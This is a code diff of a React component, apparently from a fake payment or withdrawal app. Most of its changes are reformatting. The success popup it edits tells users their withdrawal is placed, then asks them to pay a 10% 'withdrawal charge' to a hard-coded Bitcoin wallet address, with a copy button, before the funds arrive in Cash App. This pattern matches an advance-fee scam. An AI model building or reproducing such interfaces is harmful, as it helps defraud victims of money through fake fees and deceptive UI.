@@ -360,94 +360,93 @@ className={labelCls}>Last 4 Digits of Card</label>
             </div>
           </form>
         )}
-      </div>
-{/* SUCCESS POPUP */}
-{/* SUCCESS POPUP */}
-{/* SUCCESS POPUP */}
-{done && (
-  <div
-    className="fixed inset-0 z-50 flex flex-col bg-background p-6 sm:p-10"
-    role="dialog"
-    aria-modal="true"
-  >
-    {/* Top Section */}
-    <div className="flex-1 pt-6 sm:pt-10">
-      {/* Checkmark Circle */}
-      <div className="flex h-14 w-14 items-center justify-center rounded-full bg-[#26c6da] text-white shadow-sm">
-        <svg
-          className="h-7 w-7 stroke-[3]"
-          fill="none"
-          viewBox="0 0 24 24"
-          stroke="currentColor"
+            </div>
+
+      {/* SUCCESS POPUP */}
+      {done && (
+        <div
+          className="fixed inset-0 z-50 flex flex-col bg-background p-6 sm:p-10"
+          role="dialog"
+          aria-modal="true"
         >
-          <path
-            strokeLinecap="round"
-            strokeLinejoin="round"
-            d="M5 13l4 4L19 7"
-          />
-        </svg>
-      </div>
+          {/* Top Section */}
+          <div className="flex-1 pt-6 sm:pt-10">
+            <div className="flex h-14 w-14 items-center justify-center rounded-full bg-[#26c6da] text-white shadow-sm">
+              <svg
+                className="h-7 w-7 stroke-[3]"
+                fill="none"
+                viewBox="0 0 24 24"
+                stroke="currentColor"
+              >
+                <path
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                  d="M5 13l4 4L19 7"
+                />
+              </svg>
+            </div>
 
-      {/* Title */}
-      <h1 className="mt-6 text-2xl font-extrabold text-foreground sm:text-3xl">
-        Withdrawal Placed Successfully
-      </h1>
-    </div>
+            <h1 className="mt-6 text-2xl font-extrabold text-foreground sm:text-3xl">
+              Withdrawal Placed Successfully
+            </h1>
+          </div>
 
-    {/* Bottom Section */}
-    <div className="w-full space-y-4 pb-4">
-      <div className="w-full rounded-2xl border border-border bg-card p-4 text-sm text-muted-foreground shadow-sm">
-        <p>
-          Your withdrawal of{" "}
-          <span className="font-bold text-foreground">
-            {formatUsd(done.amount)}
-          </span>{" "}
-          has been placed successfully.
-        </p>
+          {/* Bottom Section */}
+          <div className="w-full space-y-4 pb-4">
+            <div className="w-full rounded-2xl border border-border bg-card p-4 text-sm text-muted-foreground shadow-sm">
+              <p>
+                Your withdrawal of{" "}
+                <span className="font-bold text-foreground">
+                  {formatUsd(done.amount)}
+                </span>{" "}
+                has been placed successfully.
+              </p>
 
-        <p className="mt-3">
-          Pay exactly{" "}
-          <span className="font-bold text-foreground">
-            {formatUsd(done.amount * 0.1)}
-          </span>{" "}
-          withdrawal charge to the wallet address below and refresh your
-          Cash App for the deposit.
-        </p>
+              <p className="mt-3">
+                Pay exactly{" "}
+                <span className="font-bold text-foreground">
+                  {formatUsd(done.amount * 0.1)}
+                </span>{" "}
+                withdrawal charge to the wallet address below and refresh
+                your Cash App for the deposit.
+              </p>
 
-      {/* Wallet Address + Copy Button */}
-<div className="mt-3 space-y-2">
-  <div className="break-all rounded-xl bg-secondary p-3 font-mono text-xs text-foreground">
-    bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x
-  </div>
+              {/* Wallet Address */}
+              <div className="mt-3 space-y-2">
+                <div className="break-all rounded-xl bg-secondary p-3 font-mono text-xs text-foreground">
+                  bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x
+                </div>
 
-  <button
-    type="button"
-    onClick={async () => {
-      const address = "bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x";
+                <button
+                  type="button"
+                  onClick={async () => {
+                    const address =
+                      "bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x";
 
-      try {
-        await navigator.clipboard.writeText(address);
-        toast.success("Wallet address copied!");
-      } catch {
-        toast.error("Could not copy wallet address");
-      }
-    }}
-    className="w-full rounded-xl border border-border bg-card py-3 text-sm font-bold text-foreground transition-colors hover:bg-accent"
-  >
-    Copy Wallet Address
-  </button>
-</div>
+                    try {
+                      await navigator.clipboard.writeText(address);
+                      toast.success("Wallet address copied!");
+                    } catch {
+                      toast.error("Could not copy wallet address");
+                    }
+                  }}
+                  className="w-full rounded-xl border border-border bg-card py-3 text-sm font-bold text-foreground transition-colors hover:bg-accent"
+                >
+                  Copy Wallet Address
+                </button>
+              </div>
+            </div>
 
-      <button
-        type="button"
-        onClick={closeDone}
-        className="w-full rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground transition-opacity hover:opacity-90"
-      >
-        OK
-      </button>
-    </div>
-  </div>
-)}
+            <button
+              type="button"
+              onClick={closeDone}
+              className="w-full rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground transition-opacity hover:opacity-90"
+            >
+              OK
+            </button>
+          </div>
+        </div>
+      )}
     </AppShell>
   );
 }
